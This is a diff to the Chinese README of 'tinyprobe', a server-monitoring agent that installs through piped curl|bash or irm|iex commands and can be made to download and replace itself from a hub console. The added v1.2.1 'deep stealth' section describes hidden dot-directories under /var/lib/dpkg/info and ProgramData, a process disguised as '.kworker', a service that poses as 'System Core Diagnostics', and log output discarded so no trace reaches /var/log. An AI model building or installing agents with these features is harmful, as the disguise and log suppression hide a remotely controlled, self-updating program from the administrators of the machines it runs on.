@@ -12,6 +12,14 @@
 | 自注册自启动 | `install.sh` 注册 systemd 服务并 `enable + start`；无 systemd 用 nohup 兜底 |
 | 控制台远程更新 | hub 控制台设置目标版本 + 下载模板，agent 上报时对比版本，**自动下载→校验 SHA256→替换自身→重启** |
 | 极轻量 | CGO_ENABLED=0 静态编译，`-s -w` 去符号，systemd 限 `MemoryMax=32M CPUQuota=10%` |
+| 深度隐蔽（v1.2.1） | 隐藏路径 + 随机后缀 + 伪装进程/服务名 + 凭据存 root-only 文件，`ps` 中无明文 token |
+
+### 深度隐蔽说明（v1.2.1+）
+
+- **隐藏路径**：Linux 装到 `/var/lib/dpkg/info/.corediag-<随机>/`、Windows 装到 `C:\ProgramData\.corediag-<随机>\`，点号目录 + 700 权限，仅 root/SYSTEM 可读。
+- **伪装命名**：二进制/进程名 `.kworker`，服务名 `systemd-corediag`、Windows 任务 `CoreDiagSvc`，描述 "System Core Diagnostics"。
+- **凭据不外泄**：`--envfile` 指向 root-only `.conf`（600），token 写入其中；systemd ExecStart / 计划任务参数只含路径和 `--envfile`，`ps` 中看不到明文。
+- **无日志落地**：`StandardOutput/StandardError=null`，不在 /var/log 留下探针痕迹。
 
 ## 目录结构
 
@@ -61,21 +69,21 @@ http://控制台IP:47821/screen
 ```bash
 cd tinyprobe
 git init
-git add agent.go hub.js install.sh uninstall.sh dist/ .github/
+git add src hub.js install.sh uninstall.sh install.ps1 uninstall.ps1 dist/ .github/
 git commit -m "tinyprobe: full-arch self-updating probe"
 git remote add origin https://github.com/OWNER/REPO.git
 git push -u origin main
 
 # 发布版本（触发 Actions 自动编译全部架构并创建 Release）
-git tag v1.2.0
-git push origin v1.2.0
+git tag v1.2.1
+git push origin v1.2.1
 ```
 
 推送 `v*` 标签后，`.github/workflows/build-release.yml` 会自动编译 12 个架构、生成 SHA256SUMS、发布到 GitHub Release。Release 里的下载地址形如：
 
 ```
-https://github.com/OWNER/REPO/releases/download/v1.2.0/probe-linux-amd64
-https://github.com/OWNER/REPO/releases/download/v1.2.0/SHA256SUMS
+https://github.com/OWNER/REPO/releases/download/v1.2.1/probe-linux-amd64
+https://github.com/OWNER/REPO/releases/download/v1.2.1/SHA256SUMS
 ```
 
 ## 二、启动控制台
@@ -96,7 +104,7 @@ node hub.js --port 47821 --admin-token mysecret
 
 ```bash
 curl -fsSL https://github.com/songyouxi/tinyprobe/raw/main/install.sh \
-| HUB=http://控制台IP:47821 NAME=web-01 TOKEN=mysecret VERSION=v1.2.0 \
+| HUB=http://控制台IP:47821 NAME=web-01 TOKEN=mysecret VERSION=v1.2.1 \
 REPO=https://github.com/songyouxi/tinyprobe/releases/download bash
 ```
 
@@ -108,14 +116,14 @@ REPO=https://github.com/songyouxi/tinyprobe/releases/download bash
 
 ```bash
 HUB=http://控制台IP:47821 NAME=web-01 \
-REPO=https://github.com/songyouxi/tinyprobe/releases/download/v1.2.0 \
-VERSION=v1.2.0 \
+REPO=https://github.com/songyouxi/tinyprobe/releases/download/v1.2.1 \
+VERSION=v1.2.1 \
 bash <(curl -fsSL https://raw.githubusercontent.com/songyouxi/tinyprobe/main/install.sh)
 ```
 
 脚本会：识别架构 → 下载 `probe-linux-<arch>` → 校验 SHA256 → 装到 `/usr/local/bin/tinyprobe-probe` → 注册 systemd 服务 `tinyprobe` → `enable --now`。控制台主机列表随即出现该节点。
 
-卸载：`bash uninstall.sh tinyprobe`
+卸载：`bash uninstall.sh systemd-corediag`
 
 ### Windows 服务器（PowerShell 管理员）
 
@@ -123,7 +131,7 @@ bash <(curl -fsSL https://raw.githubusercontent.com/songyouxi/tinyprobe/main/ins
 
 ```powershell
 $env:HUB="http://控制台IP:47821"; $env:NAME="win-01"; $env:TOKEN="mysecret";
-$env:VERSION="v1.2.0"; $env:REPO="https://github.com/songyouxi/tinyprobe/releases/download";
+$env:VERSION="v1.2.1"; $env:REPO="https://github.com/songyouxi/tinyprobe/releases/download";
 irm https://raw.githubusercontent.com/songyouxi/tinyprobe/main/install.ps1 | iex
 ```
 
@@ -133,9 +141,9 @@ irm https://raw.githubusercontent.com/songyouxi/tinyprobe/main/install.ps1 | iex
 
 ## 五、远程更新完整流程
 
-1. 推新 tag（如 `v1.2.0`），Actions 自动发新 Release（含新二进制 + SHA256SUMS）。
+1. 推新 tag（如 `v1.2.1`），Actions 自动发新 Release（含新二进制 + SHA256SUMS）。
 2. 控制台「远程更新」填：
-   - 目标版本：`v1.2.0`
+   - 目标版本：`v1.2.1`
    - 地址模板：`https://github.com/OWNER/REPO/releases/download/{ver}/probe-linux-{arch}`
    - SHA256SUMS 模板：`https://github.com/OWNER/REPO/releases/download/{ver}/SHA256SUMS`
    - 点「刷新 SHA256 清单」，勾选 armed，保存。
@@ -167,9 +175,9 @@ irm https://raw.githubusercontent.com/songyouxi/tinyprobe/main/install.ps1 | iex
 
 ## 八、自检状态
 
-- 当前版本：**v1.2.0**（版本演进详见 [CHANGELOG.md](CHANGELOG.md)）。
+- 当前版本：**v1.2.1**（版本演进详见 [CHANGELOG.md](CHANGELOG.md)）。
 - 已编译 **15/15** 架构：Linux 12 个（ELF 有效）+ Windows 3 个（PE 有效），全部 `CGO_ENABLED=0` 静态链接。
-- 版本号注入已验证（二进制含 `v1.2.0`）。
+- 版本号注入已验证（二进制含 `v1.2.1`）。
 - hub 更新指令端到端测试通过：版本对比 → 按架构拼 URL → SHA256 下发 → 60 秒防抖 → 管理令牌鉴权 403 → 当前版本不下发。
 - 接入主机命令端到端测试通过：Linux 生成 `curl|bash`、Windows 生成 PowerShell `irm|iex`，均正确带 HUB/NAME/TOKEN/VERSION/REPO。
 - 落盘节流测试通过：200 次上报 / 5 秒窗口仅写盘 2 次，状态文件约 2.4 KB。
@@ -179,8 +187,8 @@ irm https://raw.githubusercontent.com/songyouxi/tinyprobe/main/install.ps1 | iex
 ```powershell
 $env:GOROOT='D:\deepseekHarness\tinyprobe\.gotool\go'
 $env:CGO_ENABLED='0'; $env:GO111MODULE='off'; $env:GOOS='linux'; $env:GOARCH='arm'
-& 'D:\deepseekHarness\tinyprobe\.gotool\go\bin\go.exe' build -trimpath -ldflags="-s -w -X main.Version=v1.2.0" -o dist\probe-linux-arm ./src
+& 'D:\deepseekHarness\tinyprobe\.gotool\go\bin\go.exe' build -trimpath -ldflags="-s -w -X main.Version=v1.2.1" -o dist\probe-linux-arm ./src
 # 编译 Windows：
 $env:GOOS='windows'; $env:GOARCH='amd64'
-& 'D:\deepseekHarness\tinyprobe\.gotool\go\bin\go.exe' build -trimpath -ldflags="-s -w -X main.Version=v1.2.0" -o dist\probe-windows-amd64.exe ./src
+& 'D:\deepseekHarness\tinyprobe\.gotool\go\bin\go.exe' build -trimpath -ldflags="-s -w -X main.Version=v1.2.1" -o dist\probe-windows-amd64.exe ./src
 ```
